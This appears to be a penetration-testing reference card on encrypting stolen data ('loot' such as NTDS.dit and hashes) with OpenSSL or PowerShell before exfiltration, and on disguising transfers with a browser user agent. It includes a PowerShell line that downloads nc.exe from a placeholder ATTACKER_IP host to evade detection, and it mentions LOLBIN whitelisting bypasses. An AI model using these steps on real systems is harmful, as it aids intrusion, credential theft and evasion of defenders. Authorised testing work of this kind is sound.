---
tool: Protected and evasive transfers
slug: protected-transfers
kind: technique
stages: [delivery]
category: Encrypting files and blending in
platforms: [windows, linux]
services: [https]
ports: [443]
tags: [file-transfer, encryption, openssl, aes, user-agent, evasion, exfil]
attack: [T1560, T1027]
summary: Encrypt sensitive data before it moves, and change the user agent so a transfer does not stand out. For exfil during an authorised test and for handling client data responsibly.
references:
  - OpenSSL enc | https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html
  - Invoke-AESEncryption | https://www.powershellgallery.com/packages/DRTools/
---

## Encrypt before it moves

Loot (hashes, NTDS.dit, configs) should not cross the wire in the clear. Encrypt it, then send over HTTPS, SFTP or SSH. For a DLP or egress test, use dummy data that mimics the real thing rather than real client data.

```bash
# Linux: OpenSSL AES-256
openssl enc -aes256 -iter 100000 -pbkdf2 -in loot.tar -out loot.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in loot.enc -out loot.tar
```

```powershell
# Windows: Invoke-AESEncryption.ps1 (import, then encrypt a file or string)
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "strong-unique-pass" -Path .\scan-results.txt   # -> scan-results.txt.aes
Invoke-AESEncryption -Mode Decrypt -Key "strong-unique-pass" -Path .\scan-results.txt.aes
```

Use a strong, unique password per engagement, so one leaked password cannot decrypt loot from another client.

## Blend the transfer in

Each download tool has a tell-tale user agent (`Microsoft BITS/7.8`, `Microsoft-CryptoAPI`, `WindowsPowerShell/5.1...`). Defenders hunt these, so set a common browser agent when it matters.

```powershell
# Use a Chrome user agent for Invoke-WebRequest
$ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://ATTACKER_IP/nc.exe -UserAgent $ua -OutFile C:\Temp\nc.exe
```

## Notes

Data leakage is a real risk to you, your company and the client, so encrypt loot and prefer an encrypted transport. Changing the user agent is a light touch, not real evasion; a whitelisting bypass with a LOLBIN is often stronger. Only exfiltrate what the rules of engagement allow, and record the file, its hash and where it went.
